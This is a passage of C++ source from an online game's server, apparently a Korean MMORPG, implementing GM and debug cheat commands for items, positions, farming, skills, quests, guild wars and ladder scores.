						m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					}
					break;
				}
			}
			break;

		case GIFT:
			{
				if( tokens.size() >= 2 )
				{
					int nItemSN = _ttoi(tokens[1].c_str());
					TCashCommodityData CashData;
					TCashPackageData PackageData;
					if((!g_pDataManager->GetCashCommodityData(nItemSN, CashData)) && (!g_pDataManager->GetCashPackageData(nItemSN, PackageData))) return false;

					int nItemID = g_pDataManager->GetCashCommodityItem0(nItemSN);
					if (nItemID <= 0)
					{
						std::wstring wszString = FormatW(L"해당 캐쉬커머디티에 해당시리얼에 대한 아이템아이디가 존재하지 않습니다..\r\n");
						m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					}

					m_pSession->GetDBConnection()->QueryGiftByCheat(m_pSession, nItemSN);
				}
			}
			break;

		case GETPOS:
			{
#if !defined( _VILLAGESERVER ) || defined ( _GAMESERVER ) //rlkt 2016
				//TPosition aCurPos = m_pSession->GetCurrentPos();
				
				EtVector3* pvPos = m_pSession->GetActorHandle()->GetPosition();
				
				std::wstring wszString = FormatW(L"POS (X:%.2f, Y:%.2f, Z:%.2f)", pvPos->x,pvPos->y,pvPos->z);
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#else	 // #if defined( _VILLAGESERVER )
				wstring wszString = FormatW(L"마을에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif	 // #if defined( _VILLAGESERVER )
			}
			break;

		case SETPOS:
			{
#if defined( _VILLAGESERVER )
				if(tokens.size() < 4) {
					return false;
				}
				
				int nX = _ttoi(tokens[1].c_str());
				int nY = _ttoi(tokens[2].c_str());
				int nZ = _ttoi(tokens[3].c_str());

				TPosition aCurPos = m_pSession->GetCurrentPos();

				m_pSession->ChangePos(nX, nY, nZ, 0.f, 0.f);

				std::wstring wszString = FormatW(L"캐릭터 위치 이동, 이전 위치(X:%d, Y:%d, Z:%d)", aCurPos.nX, aCurPos.nY, aCurPos.nZ);
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#else	 // #if defined( _VILLAGESERVER )
				wstring wszString = FormatW(L"마을에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif	 // #if defined( _VILLAGESERVER )
			}
			break;

#if defined(PRE_ADD_NPC_REPUTATION_SYSTEM)
		case SETREPUTE:
			{
				if( tokens.size() < 4 )
				{
					return false;
				}

				int iNpcID = _ttoi( tokens[1].c_str() );
				int iFavor = _ttoi( tokens[2].c_str() );
				int iMalice = _ttoi( tokens[3].c_str() );

				CReputationSystemRepository* pReputationRepos = m_pSession->GetReputationSystem();
				if( pReputationRepos )
				{
					int iCurFavor	= static_cast<int>(pReputationRepos->GetNpcReputation( iNpcID, IReputationSystem::NpcFavor ));
					int iCurMalice	= static_cast<int>(pReputationRepos->GetNpcReputation( iNpcID, IReputationSystem::NpcMalice ));

					CNpcReputationProcessor::Process( m_pSession, iNpcID, IReputationSystem::NpcFavor, iFavor-iCurFavor );
					CNpcReputationProcessor::Process( m_pSession, iNpcID, IReputationSystem::NpcMalice, iMalice-iCurMalice );
				}
				else
					return false;
			}
			break;
#endif // #if defined(PRE_ADD_NPC_REPUTATION_SYSTEM)
		case MASTERSYSTEM_MOD_GRADUATECOUNT:
			{
				if( tokens.size() < 2 )
					return false;

				int iGraduateCount = _ttoi( tokens[1].c_str() );
				if( iGraduateCount < 0 )
					return false;

				if( m_pSession == NULL || m_pSession->CheckDBConnection() == false )
					return false;

				m_pSession->GetDBConnection()->QueryModMasterSystemGraduateCount( m_pSession, iGraduateCount );
				break;
			}
		case MASTERSYSTEM_SKIP_DATE:
			{
#if defined( _VILLAGESERVER ) && !defined( _FINAL_BUILD )
				if( tokens.size() < 2 )
					return false;

				bool bIsSkip = _ttoi( tokens[1].c_str() ) ? true : false;
				m_pSession->m_bIsMasterSystemSkipDate =  bIsSkip;
#else
				wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _VILLAGESERVER )
				break;
			}
		case MASTERSYSTEM_MOD_FAVORPOINT:
			{
#if defined( _GAMESERVER )
				if( tokens.size() < 3 )
					return false;
	
				int iPoint = _ttoi( tokens[2].c_str() );
				if( iPoint < 0 )
					return false;

				if( m_pSession == NULL || m_pSession->CheckDBConnection() == false )
					return false;

				// 제자있는지 검사
				if( m_pSession->GetMasterSystemData()->SimpleInfo.iPupilCount <= 0 )
					return false;

				CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
				if( pGameRoom == NULL )
					return false;

				INT64 biPupilCharacterDBID = 0;
				for( UINT i=0 ;i<pGameRoom->GetUserCount() ; ++i )
				{
					CDNUserSession* pSession = pGameRoom->GetUserData(i);
					if( pSession && wcscmp( pSession->GetCharacterName(), tokens[1].c_str() ) == 0 )
					{
						biPupilCharacterDBID = pSession->GetCharacterDBID();
						break;
					}
				}

				if( biPupilCharacterDBID == 0 )
					return false;

				m_pSession->GetDBConnection()->QueryModMasterSystemFavorPoint( m_pSession, m_pSession->GetCharacterDBID(), biPupilCharacterDBID, iPoint );
#else
				wstring wszString = FormatW(L"게임서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _GAMESERVER )
				break;
			}
		case MASTERSYSTEM_MOD_RESPECTPOINT:
			{
#if defined( _GAMESERVER )
				if( tokens.size() < 2 )
					return false;
				
				int iPoint = _ttoi( tokens[1].c_str() );
				if( iPoint < 0 )
					return false;

				if( m_pSession == NULL || m_pSession->CheckDBConnection() == false )
					return false;

				m_pSession->GetDBConnection()->QueryModMasterSystemRespectPoint( m_pSession, iPoint );
#else
				wstring wszString = FormatW(L"게임서버에서만 사용 가능한 치트키입니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif // #if defined( _GAMESERVER )
				break;
			}
			case FARM_PLANTSEED:
			{
#if defined( _GAMESERVER )
				// { FARM_PLANTSEED, _T("/plantseed"), _T("사용법(/plantseed(AreaIndex)(ActionType)(SeedInvenIndex)" },
				if( tokens.size() < 3 )
					return false;

				CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
				if( pGameRoom->bIsFarmRoom() == false )
					return false;

				CSFarmPlant TxPacket;
				memset( &TxPacket, 0, sizeof(TxPacket) );

				TxPacket.iAreaIndex				= _ttoi( tokens[1].c_str() );
				TxPacket.ActionType				= static_cast<Farm::ActionType::eType>(_ttoi( tokens[2].c_str() ));
				TxPacket.cSeedInvenIndex		= _ttoi( tokens[3].c_str() );

				pGameRoom->GetGameTask()->OnDispatchMessage( m_pSession, CS_FARM, eFarm::CS_PLANT, reinterpret_cast<char*>(&TxPacket), sizeof(TxPacket)-sizeof(TxPacket.AttachItems) );
#endif // #if defined( _GAMESERVER )
				break;
			}
			case FARM_DESTROYSEED:
			{
#if defined( _GAMESERVER )
				// { FARM_DESTROYSEED, _T("/destroyseed"), _T("사용법(/destroyseed(AreaIndex)") },
				if( tokens.size() < 2 )
					return false;

				CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
				if( pGameRoom->bIsFarmRoom() == false )
					return false;

				CGrowingArea* pArea = static_cast<CDnFarmGameTask*>(pGameRoom->GetGameTask())->GetGrowingArea( _ttoi(tokens[1].c_str() ) );
				pArea->ChangeState( Farm::AreaState::NONE );

#endif // #if defined( _GAMESERVER )
				break;
			}
			case FARM_SKIPSEED:
			{
#if defined( _GAMESERVER )
				// { FARM_SKIPSEED, _T("/skipseed"), _T("사용법(/skipseed(AreaIndex)") },
				if( tokens.size() < 2 )
					return false;

				CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
				if( pGameRoom->bIsFarmRoom() == false )
					return false;

				float fMinusSec = 2.f;
				if( tokens.size() >= 3 )
					fMinusSec = static_cast<float>(_ttoi(tokens[1].c_str() ));

				CGrowingArea* pArea = static_cast<CDnFarmGameTask*>(pGameRoom->GetGameTask())->GetGrowingArea( _ttoi(tokens[1].c_str() ) );
				if( pArea && pArea->GetState() == Farm::AreaState::GROWING )
					pArea->GetPlantSeed()->SkipSeed( fMinusSec );

#endif // #if defined( _GAMESERVER )
				break;
			}
#if defined( PRE_ADD_FARM_DOWNSCALE )
			case FARM_ADDATTR:
			{
#if defined( _GAMESERVER )
				if( tokens.size() < 2 )
					return false;

				CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
				if( pGameRoom->bIsFarmRoom() == false )
					return false;

				CDNFarmGameRoom* pFarmRoom = static_cast<CDNFarmGameRoom*>(pGameRoom);
				pFarmRoom->AddAttr( static_cast<Farm::Attr::eType>(_ttoi(tokens[1].c_str())) );

#if defined( _WORK )
				WCHAR wszTemp[MAX_PATH];
				wsprintf( wszTemp, L"농장 Attr 값은 %d 입니다.", pFarmRoom->GetAttr() );
				m_pSession->SendDebugChat( wszTemp );
#endif // #if defined( _WORK )
#endif // #if defined( _GAMESERVER )
				break;
			}
#endif // #if defined( PRE_ADD_FARM_DOWNSCALE )

#if defined( PRE_ADD_FARM_DOWNSCALE )
				case FARM_DELATTR:
				{
#if defined( _GAMESERVER )
					if( tokens.size() < 2 )
						return false;

					CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
					if( pGameRoom->bIsFarmRoom() == false )
						return false;

					CDNFarmGameRoom* pFarmRoom = static_cast<CDNFarmGameRoom*>(pGameRoom);
					pFarmRoom->DelAttr( static_cast<Farm::Attr::eType>(_ttoi(tokens[1].c_str())) );

#if defined( _WORK )
					WCHAR wszTemp[MAX_PATH];
					wsprintf( wszTemp, L"농장 Attr 값은 %d 입니다.", pFarmRoom->GetAttr() );
					m_pSession->SendDebugChat( wszTemp );
#endif // #if defined( _WORK )
#endif // #if defined( _GAMESERVER )
					break;
				}
#endif // #if defined( PRE_ADD_FARM_DOWNSCALE )

		case NESTCLEAR:
			{
				// { NESTCLEAR, _T("/nest"), _T("사용법(/nest(NestMapID)") },
				if(tokens.size() < 2)
					return false;

				int nMapID = _ttoi(tokens[1].c_str());

				const TMapInfo *pMapInfo = g_pDataManager->GetMapInfo(nMapID);
				if(!pMapInfo) return false;

#if defined(PRE_SHARE_MAP_CLEARCOUNT)
				DNTableFileFormat *pSox = GetDNTable( CDnTableDB::TMAP );				
				if( pSox->IsExistItem( nMapID ) )
				{
					int nDungeonEnterTableID = pSox->GetFieldFromLablePtr( nMapID, "_EnterConditionTableID" )->GetInteger();
					if( nDungeonEnterTableID > 0 ) 
					{
						DNTableFileFormat *pDungeonSOX = GetDNTable( CDnTableDB::TDUNGEONENTER );
						if( pDungeonSOX->IsExistItem( nDungeonEnterTableID ) ) {
							if(pDungeonSOX->GetFieldFromLablePtr( nDungeonEnterTableID, "_ShareCountMap" )->GetInteger() > 0)
							{
								nMapID = pDungeonSOX->GetFieldFromLablePtr( nDungeonEnterTableID, "_ShareCountMap" )->GetInteger();
								pMapInfo = g_pDataManager->GetMapInfo(nMapID);
								if(!pMapInfo) return false;
							}
						}
					}
				}				
#endif

				if(m_pSession->GetNestClearTotalCount(nMapID) >= (pMapInfo->nMaxClearCount + m_pSession->m_nExpandNestClearCount))
					return false;

				m_pSession->AddNestClear(nMapID);
				m_pSession->SendUpdateNestClear(m_pSession->GetNestClearCount(nMapID));
			}
			break;

#if defined( PRE_ADD_SECONDARY_SKILL )
			case ADD_SECONDARYSKILL:
			{
				// { ADD_SECONDARYSKILL, _T("/add2ndskill"), _T("사용법(/add2ndskill(SkillID)") },
				if(tokens.size() < 2)
					return false;

				int iSkillID = _ttoi(tokens[1].c_str());

				m_pSession->GetSecondarySkillRepository()->Create( iSkillID );
				break;
			}

			case DEL_SECONDARYSKILL:
			{
				// { DEL_SECONDARYSKILL, _T("/del2ndskill"), _T("사용법(/del2ndskill(SkillID)") },
				if(tokens.size() < 2)
					return false;

				int iSkillID = _ttoi(tokens[1].c_str());

				SecondarySkill::CSDelete TxPacket;
				memset( &TxPacket, 0, sizeof(TxPacket) );

				TxPacket.iSkillID = _wtoi(tokens[1].c_str());

				m_pSession->OnRecvSecondarySkillMessage( eSecondarySkill::CS_DELETE, reinterpret_cast<char*>(&TxPacket), sizeof(TxPacket) );
				break;
			}
			case ADD_SECONDARYSKILL_EXP:
			{
				// { ADD_SECONDARYSKILL_EXP, _T("/add2ndskillexp"), _T("사용법(/add2ndskillexp(SkillID)(addexp)" },
				if(tokens.size() < 3)
					return false;

				int iSkillID	= _ttoi(tokens[1].c_str());
				int iAddExp		= _ttoi(tokens[2].c_str());

				m_pSession->GetSecondarySkillRepository()->AddExp( iSkillID, iAddExp );
				break;
			}
			case ADD_SECONDARYSKILL_RECIPE:
			{
				// { ADD_SECONDARYSKILL_RECIPE, _T("/add2ndskillrecipe"), _T("사용법(/add2ndskillrecipe(SkillID)(recipeinvenindex)" },
				if(tokens.size() < 3)
					return false;

				int iSkillID	= _ttoi(tokens[1].c_str());
				int iInvenIndex	= _ttoi(tokens[2].c_str());

				const TItem* pItem = m_pSession->GetItem()->GetInventory( iInvenIndex );
				if( pItem == NULL )
					break;

				SecondarySkill::CSAddRecipe TxPacket;
				TxPacket.iSkillID		= iSkillID;
				TxPacket.cInvenType		= ITEMPOSITION_INVEN;
				TxPacket.cInvenIndex	= static_cast<BYTE>(iInvenIndex);
				TxPacket.biInvenSerial	= pItem->nSerial;

				m_pSession->OnRecvSecondarySkillMessage( eSecondarySkill::CS_ADD_RECIPE, reinterpret_cast<char*>(&TxPacket), sizeof(TxPacket) );
				break;
			}
			case ADD_SECONDARYSKILL_RECIPE_EXP:
			{
				// { ADD_SECONDARYSKILL_RECIPE_EXP, _T("/add2ndskillrecipeexp"), _T("사용법(/add2ndskillrecipeexp(SkillID)(recipeItemID)(addexp)" },
				if(tokens.size() < 4)
					return false;

				int iSkillID	= _ttoi(tokens[1].c_str());
				int iItemID		= _ttoi(tokens[2].c_str());
				int iAddExp		= _ttoi(tokens[3].c_str());

				m_pSession->GetSecondarySkillRepository()->AddRecipeExp( iSkillID, iItemID, iAddExp );
				break;
			}
			case DEL_SECONDARYSKILL_RECIPE:
			{
				// { DEL_SECONDARYSKILL_RECIPE, _T("/del2ndskillrecipe"), _T("사용법(/del2ndskillrecipe(SkillID)(recipeItemID)" },
				if(tokens.size() < 3)
					return false;

				SecondarySkill::CSDeleteRecipe TxPacket;
				memset( &TxPacket, 0, sizeof(TxPacket) );

				TxPacket.iSkillID	= _ttoi(tokens[1].c_str());
				TxPacket.iItemID	= _ttoi(tokens[2].c_str());

				m_pSession->OnRecvSecondarySkillMessage( eSecondarySkill::CS_DELETE_RECIPE, reinterpret_cast<char*>(&TxPacket), sizeof(TxPacket) );
				break;
			}
			case EXTRACT_SECONDARYSKILL_RECIPE:
			{
				// { EXTRACT_SECONDARYSKILL_RECIPE, _T("/extract2ndskillrecipe"), _T("사용법(/extract2ndskillrecipe(SkillID)(recipeItemID)" },
				if(tokens.size() < 3)
					return false;

				SecondarySkill::CSExtractRecipe TxPacket;
				memset( &TxPacket, 0, sizeof(TxPacket) );

				TxPacket.iSkillID	= _wtoi(tokens[1].c_str());
				TxPacket.iItemID	= _wtoi(tokens[2].c_str());

				m_pSession->OnRecvSecondarySkillMessage( eSecondarySkill::CS_EXTRACT_RECIPE, reinterpret_cast<char*>(&TxPacket), sizeof(TxPacket) );
				break;
			}
#endif // #if defined( PRE_ADD_SECONDARY_SKILL )

			case SET_PERIODQUEST:
			{
				if( tokens.size() <= 2 ) 
					return false;

				// 활성/비활성화 플래그값
				int nFlag = _wtoi(tokens[2].c_str());
				if( nFlag < 0 || nFlag > 1 )
					return false;

				bool bFlag;
				if(nFlag == 0) bFlag = false;
				else bFlag = true;

				// 시간을 구한다.
				time_t tStartDate = 0, tEndDate = 0;
				if(tokens.size() > 3)
				{
					char szDate[512] = {0,};
					ZeroMemory(szDate, sizeof(char)*512);
					WideCharToMultiByte( CP_ACP, 0, tokens[3].c_str(), -1, szDate, 512, NULL, NULL );

					std::vector<string> vCompleteDate;
					TokenizeA(szDate, vCompleteDate, ":");

					if(vCompleteDate.size() == PERIODQUEST_TIME_MAX)
					{
						CTimeSet tStartSet(vCompleteDate[PERIODQUEST_TIME_START].c_str(), true);
						CTimeSet tEndSet(vCompleteDate[PERIODQUEST_TIME_END].c_str(), true);

						tStartDate = tStartSet.GetTimeT64_LC();
						tEndDate = tEndSet.GetTimeT64_LC();
					}
				}

				int nWorldSetID;
#if defined(_VILLAGESERVER)
				nWorldSetID = g_Config.nWorldSetID;
#elif defined(_GAMESERVER)		
				nWorldSetID = m_pSession->GetWorldSetID();
#endif
				if(!g_pPeriodQuestSystem->SetActivateQuest(_wtoi(tokens[1].c_str()), bFlag, tStartDate, tEndDate)) 
					return false;
				
				break;
			}

			case SET_WORLDQUEST:
			{
				if( tokens.size() <= 4 ) 
					return false;

				int nScheduleID = _wtoi(tokens[1].c_str());		

				char szDate[512] = {0,};

				ZeroMemory(szDate, sizeof(char)*512);
				WideCharToMultiByte( CP_ACP, 0, tokens[2].c_str(), -1, szDate, 512, NULL, NULL );
				CTimeSet tCollectStartSet(szDate, true);

				ZeroMemory(szDate, sizeof(char)*512);
				WideCharToMultiByte( CP_ACP, 0, tokens[3].c_str(), -1, szDate, 512, NULL, NULL );
				CTimeSet tCollectEndSet(szDate, true);

				ZeroMemory(szDate, sizeof(char)*512);
				WideCharToMultiByte( CP_ACP, 0, tokens[4].c_str(), -1, szDate, 512, NULL, NULL );
				CTimeSet tRewardSet(szDate, true);
				
				if(!g_pPeriodQuestSystem->SetWorldEventTime(nScheduleID, tCollectStartSet.GetTimeT64_LC(), tCollectEndSet.GetTimeT64_LC(), tRewardSet.GetTimeT64_LC()))
					return false;

				break;
			}

			case SET_GUILDWAREVENT:
				{				
#if defined(_GAMESERVER)
					wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 길드전 시간 치트키.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );

					return false;
#else
					if( tokens.size() < 5 ) 
						return false;

					int nIndex = 1;
					int nScheduleID = _wtoi(tokens[nIndex++].c_str());

					char szDate[512] = {0,};
					ZeroMemory(szDate, sizeof(char)*512);
					WideCharToMultiByte( CP_ACP, 0, tokens[nIndex++].c_str(), -1, szDate, 512, NULL, NULL );

					int nEventPeriod = _wtoi(tokens[nIndex++].c_str());
					int nReadyPeriod = _wtoi(tokens[nIndex++].c_str());

					CTimeSet tEventTime(szDate, true);
					if(!tEventTime.CheckIntegrity())
						return false;

					TAGetGuildWarSchedule ScheduleData;
					memset(&ScheduleData, 0, sizeof(ScheduleData));

					ScheduleData.wScheduleID = (short)nScheduleID;					

					for (int i=GUILDWAR_STEP_PREPARATION; i<GUILDWAR_STEP_END; i++)
					{
						//ScheduleData.EventInfo[i].cEventStep = i;
						ScheduleData.EventInfo[i].tBeginTime = tEventTime.GetTimeT64_LC();
						tEventTime.AddSecond(nEventPeriod*60);

						//if(i == GUILDWAR_STEP_REWARD)
						//{
						//	ScheduleData.tMainBeginDate = tEventTime.GetTimeT64_LC();
						//	tEventTime.AddSecond(nEventPeriod*60);
						//}

						ScheduleData.EventInfo[i].tEndTime	= tEventTime.GetTimeT64_LC();
						tEventTime.AddSecond(nReadyPeriod*60);
					}

					if( g_pMasterConnection && g_pMasterConnection->GetActive() )					
						g_pMasterConnection->SendSetGuildWarSchedule(ERROR_NONE, ScheduleData.wScheduleID, ScheduleData.wWinersWeightRate, ScheduleData.EventInfo, true, true, 0);
					break;
#endif //#if defined(_GAMESERVER)
				}
		case SET_PREWINGUILDUID:
		{		
			if( !m_pSession->GetGuildUID().IsSet() )
				return false;

			TGuildUID GuildUID = m_pSession->GetGuildUID();
#if defined( _VILLAGESERVER )
			g_pGuildWarManager->SetPreWinGuildUID( GuildUID );
			CDNGuildBase* pGuild = g_pGuildManager->At (GuildUID);
			if (!pGuild)
				break;

#if !defined( PRE_ADD_NODELETEGUILD )
			CDetachAutoEx<CDNGuildBase>	AutoDetach (pGuild);
			if (FALSE == pGuild->IsEnable()) break;
#endif
			CDNGuildVillage* pGuildVillage = static_cast<CDNGuildVillage *>(pGuild);
			pGuildVillage->SendGuildWarPreWinGuild(true);
#else
			g_pMasterConnectionManager->SetPreWinGuildUID( m_pSession->GetWorldSetID(), GuildUID );
#endif // #if defined( _VILLAGESERVER )
			break;
		}
		case SET_GUILDWAR_FINALTIME:
		{
#if defined( _GAMESERVER )
			if( tokens.size() < 2 ) 
				return false;
			CTimeSet CurTime;
			CurTime.AddSecond( _wtoi(tokens[1].c_str()) );
			g_pMasterConnectionManager->SetGuildWarFinalStartTimeForCheat( m_pSession->GetWorldSetID(), CurTime.GetTimeT64_LC() );
#endif // #if defined( _GAMESERVER )
			break;
		}
		case SET_GUILDWARSCHEDULE_RELOAD :
			{
#if defined(_VILLAGESERVER)
				if( g_pMasterConnection && g_pMasterConnection->GetActive() )
					g_pMasterConnection->SendGuildWarScheduleReload();
#endif
				break;
			}
		case SET_TITLE:
			{
				if( tokens.size() < 2 ) 
					return false;

				int nIndex = _wtoi(tokens[1].c_str());
				if( nIndex-1 >= APPELLATIONMAX_BITSIZE )
					return false;

				m_pSession->GetAppellation()->RequestAddAppellation( nIndex-1 );
				break;
			}
		// { SET_LADDER_POINT, _T("/setladderpoint"), _T("사용법(/setladderpoint(1:1=1,2:2=2...등등등)(래더포인트)") },
		case SET_LADDER_POINT:
		{
			if( tokens.size() != 3 )
				return false;

			LadderSystem::MatchType::eCode MatchType = static_cast<LadderSystem::MatchType::eCode>(_ttoi( tokens[1].c_str() ));
			if( LadderSystem::bIsServiceMatchType( MatchType ) == false )
				return false;

			m_pSession->GetDBConnection()->QueryModPvPLadderScoresForCheat( m_pSession, MatchType, _ttoi(tokens[2].c_str()), m_pSession->GetPvPLadderScoreInfoPtr()->GetGradePoint( MatchType ), m_pSession->GetPvPLadderScoreInfoPtr()->GetHiddenGradePoint( MatchType ) );
			break;
		}
		// { SET_LADDER_GRADEPOINT, _T("/setladdergradepoint"), _T("사용법(/setladdergradepoint(1:1=1,2:2=2...등등등)(평점)") },
		case SET_LADDER_GRADEPOINT:
		{
			if( tokens.size() != 3 )
				return false;

			LadderSystem::MatchType::eCode MatchType = static_cast<LadderSystem::MatchType::eCode>(_ttoi( tokens[1].c_str() ));
			if( LadderSystem::bIsServiceMatchType( MatchType ) == false )
				return false;

			m_pSession->GetDBConnection()->QueryModPvPLadderScoresForCheat( m_pSession, MatchType, m_pSession->GetPvPLadderScoreInfoPtr()->iPvPLadderPoint, _ttoi(tokens[2].c_str()), m_pSession->GetPvPLadderScoreInfoPtr()->GetHiddenGradePoint( MatchType ) );
			break;
		}
		// { SET_LADDER_HIDDENGRADEPOINT, _T("/setladderhiddengradepoint"), _T("사용법(/setladderhiddengradepoint(1:1=1,2:2=2...등등등)(가평점)") },
		case SET_LADDER_HIDDENGRADEPOINT:
		{
			if( tokens.size() != 3 )
				return false;

			LadderSystem::MatchType::eCode MatchType = static_cast<LadderSystem::MatchType::eCode>(_ttoi( tokens[1].c_str() ));
			if( LadderSystem::bIsServiceMatchType( MatchType ) == false )
				return false;

			m_pSession->GetDBConnection()->QueryModPvPLadderScoresForCheat( m_pSession, MatchType, m_pSession->GetPvPLadderScoreInfoPtr()->iPvPLadderPoint, m_pSession->GetPvPLadderScoreInfoPtr()->GetGradePoint( MatchType ), _ttoi(tokens[2].c_str()) );
			break;
		}
		// { GET_LADDER_POINT, _T("/getladderpoint"), _T("사용법(/getladderpoint(1:1=1,2:2=2...등등등)") },
		case GET_LADDER_POINT:
		{
			if( tokens.size() != 2 )
				return false;

			LadderSystem::MatchType::eCode MatchType = static_cast<LadderSystem::MatchType::eCode>(_ttoi( tokens[1].c_str() ));
			if( LadderSystem::bIsServiceMatchType( MatchType ) == false )
				return false;

			WCHAR wszBuf[MAX_PATH];
			wsprintf( wszBuf, L"LadderPoint:%d LadderGradePoint=%d HiddenLadderGradePoint=%d", m_pSession->GetPvPLadderScoreInfoPtr()->iPvPLadderPoint, m_pSession->GetPvPLadderScoreInfoPtr()->GetGradePoint(MatchType), m_pSession->GetPvPLadderScoreInfoPtr()->GetHiddenGradePoint(MatchType) );

			m_pSession->SendDebugChat( wszBuf );

			break;
		}
		// { FORCE_LADDER_MATCHING, _T("/forcematching"), _T("사용법(/forcematching") },
		case FORCE_LADDER_MATCHING:
		{
#if defined( _VILLAGESERVER )
			LadderSystem::CRoom* pRoom = LadderSystem::CManager::GetInstance().GetRoomPtr( m_pSession->GetCharacterName() );
			if( pRoom )
				pRoom->ToggleForceMatching();
#else
			wstring wszString = FormatW(L"빌리지서버에서만 사용 가능한 치트키입니다.\r\n");
			m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );	
#endif // #if !defined( _VILLAGESERVER )
			break;
		}

		case SET_SECOND_JOB_SKILL:
			{
#ifdef _VILLAGESERVER
				wstring wszString = FormatW(L"게임서버에서만 사용 가능한 2차전직 스킬 임시로 얻는 치트키.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );

				return false;
#else
				// 2차 전직 직업 번호로 전직할 수 있는지 가능 여부에 따라 진행.
				if((int)tokens.size() < 2 )
					return false;

				int iJobID = _wtoi( tokens[1].c_str() );
				CDnPlayerActor* pPlayerActor = m_pSession->GetPlayerActor();
				if( pPlayerActor )
				{
					if( pPlayerActor->CanChangeJob( iJobID ) )
					{
						// 각 직업별로 들어가는 2차 전직 스킬들의 ID
						switch( iJobID )
						{
							// 소드마스터 -> 글래디에이터
							case 23:
								{
									// 임시 스킬 추가에 대해서 클라로 패킷도 보냄..
									pPlayerActor->AddTempSkill( 301 );	// 이베이젼 슬래쉬
									pPlayerActor->AddTempSkill( 302 );	// 트리플 슬래쉬 ex
									pPlayerActor->AddTempSkill( 303 );	// 피니쉬 어택
								}
								break;

							// 소드마스터 -> 워로드
							case 24:
								{
									pPlayerActor->AddTempSkill( 351 );	// 문 블레이드 댄스
									pPlayerActor->AddTempSkill( 352 );	// 문라이트 스플린터 ex
									pPlayerActor->AddTempSkill( 353 );	// 플래쉬 스탠스
								}
								break;

							// 머셔너리 -> 바바리안
							case 25:
								{
									pPlayerActor->AddTempSkill( 501 );	// 어펜드 히트
									pPlayerActor->AddTempSkill( 502 );	// 스톰프 ex
									pPlayerActor->AddTempSkill( 503 );	// 본 크래쉬
								}
								break;

							// 머셔너리 -> 디스트로이어
							case 26:
								{
									pPlayerActor->AddTempSkill( 551 );	// 브레이킹 포인트
									pPlayerActor->AddTempSkill( 552 );	// 플라잉 스윙 ex
									pPlayerActor->AddTempSkill( 553 );	// 메일스트롬 하울
								}
								break;

							// 보우마스터 -> 스나이퍼
							case 29:
								{
									pPlayerActor->AddTempSkill( 1301 );	// 크리티컬 브레이크
									pPlayerActor->AddTempSkill( 1302 );	// 차지샷 ex
									pPlayerActor->AddTempSkill( 1303 );	// 치팅 포인트
								}
								break;

							// 보우마스터 -> 아틸러리
							case 30:
								{
									pPlayerActor->AddTempSkill( 1351 );	// 매지컬 브리즈
									pPlayerActor->AddTempSkill( 1352 );	// 익스텐션 애로우 ex
									pPlayerActor->AddTempSkill( 1353 );	// 데토네이팅 애로우
								}
								break;

							// 아크로뱃 -> 템페스트
							case 31:
								{
									pPlayerActor->AddTempSkill( 1501 );	// 이베이드
									pPlayerActor->AddTempSkill( 1502 );	// 킥 앤 샷 ex
									pPlayerActor->AddTempSkill( 1503 );	// 허리케인 댄스
								}
								break;

							// 아크로뱃 -> 윈드워커
							case 32:
								{
									pPlayerActor->AddTempSkill( 1551 );	// 쇼타임
									pPlayerActor->AddTempSkill( 1552 );	// 스파이럴 킥 ex
									pPlayerActor->AddTempSkill( 1553 );	// 라이징 스톰
								}
								break;

							// 엘리멘탈로드 -> 셀레아나
							case 35:
								{
									pPlayerActor->AddTempSkill( 2301 );	// 익스플로전
									pPlayerActor->AddTempSkill( 2302 );	// 파이어볼 ex
									pPlayerActor->AddTempSkill( 2303 );	// 롤링 라바
								}
								break;

							// 엘리멘탈로드 -> 엘레스트라
							case 36:
								{
									pPlayerActor->AddTempSkill( 2351 );	// 아이스 배리어
									pPlayerActor->AddTempSkill( 2352 );	// 아이스 소드 ex
									pPlayerActor->AddTempSkill( 2353 );	// 아이시클 인젝션									}
								break;

							// 포스유저 -> 스매셔
							case 37:
								{
									pPlayerActor->AddTempSkill( 2501 );	// 아케인
									pPlayerActor->AddTempSkill( 2502 );	// 리니어 레이 ex
									pPlayerActor->AddTempSkill( 2503 );	// 오비틀 레이저
								}
								break;

							// 포스유저 -> 마제스티
							case 38:
								{
									pPlayerActor->AddTempSkill( 2551 );	// 스틸 매직
									pPlayerActor->AddTempSkill( 2552 );	// 그라비티볼 ex
									pPlayerActor->AddTempSkill( 2553 );	// 스위치 그라비티
								}
								break;

